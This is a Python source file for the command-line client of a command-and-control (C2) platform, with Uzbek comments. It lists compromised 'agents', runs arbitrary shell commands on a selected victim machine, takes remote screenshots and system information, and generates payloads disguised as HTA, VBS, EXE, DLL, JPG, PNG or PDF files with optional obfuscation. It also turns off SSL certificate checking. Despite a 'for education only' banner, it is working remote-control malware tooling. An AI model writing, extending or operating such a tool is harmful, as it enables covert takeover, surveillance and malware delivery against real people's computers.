"""
C2 Platform CLI - Command Line Interface
"""

import cmd
import requests
import json
from datetime import datetime
import sys
import os

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *
from common.jwt_auth import JWTAuthManager


class C2CLI(cmd.Cmd):
    """C2 Platform uchun CLI interface"""
    
    intro = """
╔══════════════════════════════════════════════════════════════╗
║                    🎯 C2 Platform CLI                        ║
║                  Command Line Interface                      ║
║                                                              ║
║  🔒 HTTPS + JWT Authentication                              ║
║  ⚠️  Faqat ta'lim maqsadida ishlatilsin!                    ║
║                                                              ║
║  Yordam uchun: help yoki ?                                  ║
╚══════════════════════════════════════════════════════════════╝
"""
    
    prompt = "C2> "
    
    def __init__(self):
        super().__init__()
        # HTTPS Server bilan ulanish
        self.server_url = f"https://{SERVER_HOST}:8443"  # HTTPS port
        
        # JWT Authentication
        self.auth_manager = JWTAuthManager(
            server_url=self.server_url,
            verify_ssl=False  # Self-signed certificate uchun
        )
        self.session = self.auth_manager.get_session()
        self.current_agent = None
        
        # Login qilish
        self.login()
    
    def do_agents(self, line):
        """Barcha agentlar ro'yxatini ko'rsatish"""
        try:
            response = self.session.get(f"{self.server_url}/api/agents")
            if response.status_code == 200:
                data = response.json()
                agents = data.get('agents', {})
                
                if not agents:
                    print("❌ Hech qanday agent ulanmagan")
                    return
                
                print("\\n📱 Ulangan Agentlar:")
                print("-" * 80)
                print(f"{'ID':<10} {'Hostname':<20} {'Platform':<15} {'IP Address':<15} {'Status':<8}")
                print("-" * 80)
                
                for agent_id, agent in agents.items():
                    info = agent.get('info', {})
                    status_icon = "🟢" if agent.get('status') == 'online' else "🔴"
                    print(f"{agent_id[:8]:<10} {info.get('hostname', 'N/A'):<20} "
                          f"{info.get('platform', 'N/A')[:15]:<15} {info.get('ip_address', 'N/A'):<15} "
                          f"{status_icon} {agent.get('status', 'offline'):<8}")
                
                print("-" * 80)
                print(f"Jami: {len(agents)} agent")
            else:
                print(f"❌ Agentlarni olishda xato: {response.status_code}")
        except Exception as e:
            print(f"❌ Server bilan aloqa xatosi: {e}")
    
    def do_select(self, agent_id):
        """Agentni tanlash: select <agent_id>"""
        if not agent_id:
            print("❌ Agent ID talab qilinadi. Masalan: select 12345678")
            return
        
        try:
            response = self.session.get(f"{self.server_url}/api/agents")
            if response.status_code == 200:
                agents = response.json().get('agents', {})
                
                # Agent ID ni to'liq yoki qisqa ko'rinishda qidirish
                selected_agent = None
                for full_id, agent in agents.items():
                    if full_id.startswith(agent_id) or full_id == agent_id:
                        selected_agent = full_id
                        break
                
                if selected_agent:
                    self.current_agent = selected_agent
                    agent_info = agents[selected_agent].get('info', {})
                    hostname = agent_info.get('hostname', 'N/A')
                    self.prompt = f"C2[{hostname}]> "
                    print(f"✅ Agent tanlandi: {hostname} ({selected_agent[:8]})")
                else:
                    print(f"❌ Agent topilmadi: {agent_id}")
            else:
                print("❌ Agentlar ro'yxatini olishda xato")
        except Exception as e:
            print(f"❌ Xato: {e}")
    
    def do_deselect(self, line):
        """Agentni bekor qilish"""
        self.current_agent = None
        self.prompt = "C2> "
        print("✅ Agent tanlov bekor qilindi")
    
    def do_exec(self, command):
        """Tanlangan agentda komanda bajarish: exec <command>"""
        if not self.current_agent:
            print("❌ Birinchi agentni tanlang: select <agent_id>")
            return
        
        if not command:
            print("❌ Komanda talab qilinadi. Masalan: exec whoami")
            return
        
        try:
            cmd_data = {
                "agent_id": self.current_agent,
                "command": "exec",
                "data": command
            }
            
            response = self.session.post(
                f"{self.server_url}/api/command",
                json=cmd_data
            )
            
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Komanda yuborildi: {command}")
                print("💡 Natija keyingi heartbeat da keladi")
            else:
                print(f"❌ Komanda yuborishda xato: {response.text}")
        except Exception as e:
            print(f"❌ Xato: {e}")
    
    def do_sysinfo(self, line):
        """Tanlangan agentdan sistem ma'lumotlarini olish"""
        if not self.current_agent:
            print("❌ Birinchi agentni tanlang: select <agent_id>")
            return
        
        try:
            cmd_data = {
                "agent_id": self.current_agent,
                "command": "sysinfo"
            }
            
            response = self.session.post(
                f"{self.server_url}/api/command",
                json=cmd_data
            )
            
            if response.status_code == 200:
                print("✅ System info so'rovi yuborildi")
                print("💡 Ma'lumotlar keyingi heartbeat da keladi")
            else:
                print(f"❌ Xato: {response.text}")
        except Exception as e:
            print(f"❌ Xato: {e}")
    
    def do_screenshot(self, quality='85'):
        """Tanlangan agentdan screenshot olish: screenshot [quality]"""
        if not self.current_agent:
            print("❌ Birinchi agentni tanlang: select <agent_id>")
            return
        
        try:
            # Quality parametri
            if not quality:
                quality = '85'
            
            print(f"📸 Screenshot so'ralmoqda (sifat: {quality})...")
            
            response = self.session.get(
                f"{self.server_url}/api/screenshot/{self.current_agent}?quality={quality}",
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                print(f"✅ {result.get('message', 'Screenshot so\\'rovi yuborildi')}")
                print(f"🆔 Command ID: {result.get('command_id', 'N/A')}")
                print("💡 Screenshot agent tomonidan yuboriladi")
                print("💡 Natija server loglarida yoki GUI'da ko'rinadi")
            else:
                print(f"❌ Xato: {response.text}")
        except Exception as e:
            print(f"❌ Screenshot xatosi: {e}")
    
    def do_status(self, line):
        """Server holati haqida ma'lumot"""
        try:
            response = self.session.get(f"{self.server_url}/api/agents")
            if response.status_code == 200:
                agents = response.json().get('agents', {})
                online_count = sum(1 for agent in agents.values() if agent.get('status') == 'online')
                
                print("\\n📊 Server Status:")
                print("-" * 30)
                print(f"🔗 Server URL: {self.server_url}")
                print(f"📱 Jami agentlar: {len(agents)}")
                print(f"🟢 Online: {online_count}")
                print(f"🔴 Offline: {len(agents) - online_count}")
                if self.current_agent:
                    print(f"🎯 Tanlangan agent: {self.current_agent[:8]}")
                else:
                    print("🎯 Tanlangan agent: yo'q")
                print("-" * 30)
            else:
                print("❌ Serverga ulanib bo'lmadi")
        except Exception as e:
            print(f"❌ Xato: {e}")
    
    def do_clear(self, line):
        """Ekranni tozalash"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def do_exit(self, line):
        """Chiqish"""
        print("👋 Xayr!")
        return True
    
    def do_quit(self, line):
        """Chiqish"""
        return self.do_exit(line)
    
    def do_payload(self, line):
        """Payload yaratish"""
        from common.payload_generator import PayloadGenerator
        
        parts = line.split()
        if len(parts) < 2:
            print("❌ Foydalanish: payload <type> <output> [options]")
            print("   Types: python, powershell, bash, batch, vbs, hta, js, vbe, exe, scr, elf, dll, jpg, png, pdf")
            print("   Example: payload python agent.py")
            print("   Example: payload hta update.hta")
            print("   Example: payload jpg image.jpg")
            print("   Example: payload pdf document.pdf")
            return
        
        payload_type = parts[0]
        output_file = parts[1]
        obfuscate = '--obfuscate' in parts
        
        # Generator yaratish
        generator = PayloadGenerator()
        
        print(f"\n🛠️ Payload yaratilmoqda...")
        print(f"   Type: {payload_type}")
        print(f"   Output: {output_file}")
        print(f"   Obfuscate: {'Yes' if obfuscate else 'No'}")
        
        result = generator.generate(
            payload_type=payload_type,
            listener_type='http',
            output_file=output_file,
            obfuscate=obfuscate
        )
        
        if result.get('success'):
            print(f"\n✅ Payload yaratildi!")
            print(f"   Size: {result['size']:,} bytes")
            print(f"   File: {output_file}")
        else:
            print(f"\n❌ Xato: {result.get('error')}")
    
    def login(self):
        """JWT login qilish"""
        print("\n🔒 Login talab qilinadi...")
        
        # Username
        username = input("Username [admin]: ").strip() or "admin"
        
        # Password
        import getpass
        password = getpass.getpass("Password: ")
        
        if not password:
            print("❌ Parol bo'sh bo'lishi mumkin emas!")
            sys.exit(1)
        
        # Login
        print("\n⏳ Login qilinmoqda...")
        if self.auth_manager.login(username, password):
            print("✅ Login muvaffaqiyatli!")
            print(f"👤 Foydalanuvchi: {username}")
            print(f"🔗 Server: {self.server_url}\n")
        else:
            print("❌ Login xatolik! Username yoki parol noto'g'ri")
            sys.exit(1)
    
    def do_logout(self, line):
        """Logout qilish"""
        self.auth_manager.logout()
        print("✅ Logout muvaffaqiyatli")
        print("👋 Xayr!")
        return True
    
    def do_help_commands(self, line):
        """Barcha mavjud komandalar ro'yxati"""
        commands = {
            'agents': 'Barcha agentlar ro\'yxatini ko\'rsatish',
            'select <id>': 'Agentni tanlash',
            'deselect': 'Agent tanlovini bekor qilish',
            'exec <cmd>': 'Tanlangan agentda komanda bajarish',
            'sysinfo': 'Sistem ma\'lumotlarini olish',
            'screenshot [quality]': 'Ekran suratini olish (quality: 10-100)',
            'payload <type> <output>': 'Payload yaratish (type: python, powershell, bash, batch, vbs)',
            'status': 'Server holati',
            'logout': 'Logout qilish',
            'clear': 'Ekranni tozalash',
            'exit/quit': 'Chiqish'
        }
        
        print("\\n📋 Mavjud komandalar:")
        print("-" * 60)
        for cmd, desc in commands.items():
            print(f"{cmd:<30} - {desc}")
        print("-" * 60)
    
    def emptyline(self):
        """Bo'sh satr kiritilganda hech narsa qilmaslik"""
        pass
    
    def default(self, line):
        """Noma'lum komandalar uchun"""
        print(f"❌ Noma'lum komanda: {line}")
        print("💡 Yordam uchun 'help' yoki 'help_commands' yozing")


def main():
    """Asosiy funksiya"""
    print("🚀 C2 Platform CLI ishga tushmoqda...")
    print("🔒 HTTPS + JWT Authentication")
    
    try:
        cli = C2CLI()
        cli.cmdloop()
    except KeyboardInterrupt:
        print("\\n👋 CLI to'xtatildi")
    except Exception as e:
        print(f"❌ Xato: {e}")


if __name__ == "__main__":
    main()